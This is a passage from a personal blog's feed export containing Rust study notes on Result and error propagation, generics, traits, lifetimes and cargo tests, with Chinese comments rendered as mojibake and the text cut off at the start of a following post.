    <content type="html"><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesnâ€™t have exceptions. Instead, it has the type<code>Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p><p>When the <code>panic!</code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.<br><a id="more"></a><br>result enum is defined as having two variants<code>, Ok and Err,</code></p><p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).unwrap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).expect(<span class="string">"Failed to open hello.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Propagating Errors<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">"hello.txt"</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p><p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File::open(<span class="string">"hello.txt"</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">"hello.txt"</span>)</span><br></pre></td></tr></table></figure><p> If you can ensure by manually inspecting the code that youâ€™ll never have an Err variant, itâ€™s perfectly acceptable to call<code>unwrap.</code> Hereâ€™s an example:</p><h3 id="Generic-æ³›å‹"><a href="#Generic-æ³›å‹" class="headerlink" title="Generic æ³›å‹"></a>Generic æ³›å‹</h3><p>å°†ä»£ç æŠ½å–å‡ºæ¥ï¼Œå‡å°‘é‡å¤ä»£ç <br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T Uä»£è¡¨ä¸åŒçš„ç±»å‹</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p.x = &#123;&#125;"</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that we have to declare <code>T just after impl</code>so we can use it to specify that weâ€™re implementing methods on the type Point<t>.</t></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">"Hello"</span>, <span class="symbol">y:</span> <span class="string">'c'</span> &#125;;</span><br><span class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p3.x = &#123;&#125;, p3.y = &#123;&#125;"</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p><p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>ç›¸å½“äºæä¾›ä¸€ä¸ªæ¥å£ï¼Œå…·ä½“å†…å®¹è‡ªå·±å®ç°</code><br>ä¸Javaä¸€ä¸ªæ¦‚å¿µç±»ä¼¼</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>æ·»åŠ traitåˆ°ç»“æ„ä¸­</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;, by &#123;&#125; (&#123;&#125;)"</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, theyâ€™re all in the same scope. Letâ€™s say this lib.rs is for a crate weâ€™ve called aggregator and someone else wants to use our crateâ€™s functionality to implement the Summary trait on a struct defined within their libraryâ€™s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p><p>with trait implementations is that we can<code>implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>canâ€™t implement external traits on external types.</code></p><p>as we implement the trait on a particular type, we can keep or override each methodâ€™s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">"(Read more...)"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Default implementations can call other methods in the same trait, even if those other methods donâ€™t have a default implementation.</p><p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p><pre><code>fn summarize(&amp;self) -&gt; String {    format!(&quot;(Read more from {}...)&quot;, self.summarize_author())}</code></pre><p>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(â€œ@{}â€, self.username)<br>    }<br>}<br>}</p><p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}: {}â€, self.username, self.content)<br>    }<br>}</p><p>pub fn notify(item: &amp;impl Summary) {<br>    println!(â€œBreaking news! {}â€, item.summarize());<br>}</p><h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>ä¼ å…¥çš„ç±»å‹å¿…é¡»ç›¸åŒ</p><pre><code>pub fn notify(item: &amp;(impl Summary + Display)) {pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) {fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32    where T: Display + Clone,          U: Clone + Debug{</code></pre><p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}: {}â€, self.username, self.content)<br>    }<br>}</p><p>fn returns_summarizable() -&gt; <code>impl Summary {</code><br>    Tweet {<br>        username: String::from(â€œhorse_ebooksâ€),<br>        content: String::from(<br>            â€œof course, as you probably already know, peopleâ€,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>é™åˆ¶åªèƒ½ä¼ è¿›i32 charç­‰</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p><pre><code>let result = largest(&amp;number_list);println!(&quot;The largest number is {}&quot;, result);let char_list = vec![&apos;y&apos;, &apos;m&apos;, &apos;a&apos;, &apos;q&apos;];let result = largest(&amp;char_list);println!(&quot;The largest char is {}&quot;, result);</code></pre><p>}</p><p>impl&lt;T: Display&gt; ToString for T {<br>    // â€“snipâ€“<br>}</p><h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>weâ€™ll add generic lifetime parameters that define the relationship between the references </p><p>lifetime<br>Lifetime annotations <code>donâ€™t change</code> how long any of the references live. </p><pre><code>&amp;i32        // a reference&amp;&apos;a i32     // a reference with an explicit lifetime&amp;&apos;a mut i32 // a mutable reference with an explicit lifetime</code></pre><p>have a function with the parameter first that is a reference to an i32 with lifetime â€˜a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime â€˜a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">"abcd"</span>);</span><br><span class="line">    let string2 = <span class="string">"xyz"</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">"The longest string is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">'a&gt;(x: &amp;'</span>a str, <span class="symbol">y:</span> &amp;<span class="string">'a str) -&gt; &amp;'</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>è¿”å›çš„å¼•ç”¨å–æœ€çŸ­çš„lifetime</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">'a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;'</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">"Call me Ishmael. Some years ago..."</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">'.'</span>).<span class="keyword">next</span>().expect(<span class="string">"Could not find a '.'"</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>an instance of ImportantExcerpt canâ€™t <code>outlive the reference it</code><br>holds in its part field.</p><h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>ç”±ç¼–è¯‘å™¨è¿›è¡Œå¼•ç”¨lifetimeçš„ç¼–å†™<br>ä¸‰ä¸ªé˜¶æ®µ</p><h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">'static str = "I have a static lifetime.";</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>means that this reference can live for the entire duration of the program</p><p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(â€œabcdâ€);<br>    let string2 = â€œxyzâ€;</p><pre><code>let result = longest_with_an_announcement(    string1.as_str(),    string2,    &quot;Today is someone&apos;s birthday!&quot;,);println!(&quot;The longest string is {}&quot;, result);</code></pre><p>}</p><p>use std::fmt::Display;</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">'a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;'</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">'a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;'</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">"Announcement! &#123;&#125;"</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert!</code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p><p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p><p>should_panic  äº§ç”Ÿpanicè¿”å›æ­£ç¡®<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">"Guess value must be between 1 and 100, got &#123;&#125;."</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = "Guess value must be less than or equal to 100")]</span></span><br></pre></td></tr></table></figure></p><p>the unit type, ()</p><p>TDD process</p><p>test è¿˜æ˜¯å¾ˆä¸å¤šçš„ï¼ŒC++çš„æ—¶å€™éƒ½ä¸€ééè¾“å…¥å‚æ•°</p><p><code>$ cargo run &gt; output.txt</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Result-lt-T-E-gt&quot;&gt;&lt;a href=&quot;#Result-lt-T-E-gt&quot; class=&quot;headerlink&quot; title=&quot;Result&amp;lt;T, E&amp;gt;&quot;&gt;&lt;/a&gt;Result&lt;code&gt;&amp;lt;T, E&amp;gt;&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Rust doesnâ€™t have exceptions. Instead, it has the type&lt;code&gt;Result&amp;lt;T, E&amp;gt;&lt;/code&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. &lt;/p&gt;
&lt;p&gt;When the &lt;code&gt;panic!&lt;/code&gt;macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUSTå­¦ä¹ 3</title>
    <link href="http://finsenty54.github.io/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/"/>
    <id>http://finsenty54.github.io/2020/08/03/RUSTå­¦ä¹ 3/</id>
    <published>2020-08-03T05:58:28.000Z</published>
    <updated>2020-08-03T05:59:20.019Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait</code>enables us to print our struct in a way that is useful for developers so we can see its value while weâ€™re debugging our code.<br><a id="more"></a><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]  //å¼€å¯ä½¿ç”¨debug :?æ‰“å°ç»“æ„ä½“</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"rect1 is &#123;:?&#125;"</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span 